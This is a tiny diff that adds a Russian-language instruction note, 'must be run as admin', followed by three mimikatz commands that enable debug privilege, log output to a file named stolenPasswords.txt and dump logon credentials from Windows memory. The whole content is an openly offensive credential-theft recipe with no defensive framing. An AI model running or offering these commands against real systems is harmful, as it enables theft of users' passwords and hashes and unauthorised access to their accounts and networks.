@@ -1,0 +1,6 @@
+ОБЯЗАТЕЛЕН ЗАПУСК ОТ АДМИНА!!!
+Команды:
+
+privilege::debug
+log stolenPasswords.txt
+sekurlsa::logonpasswords
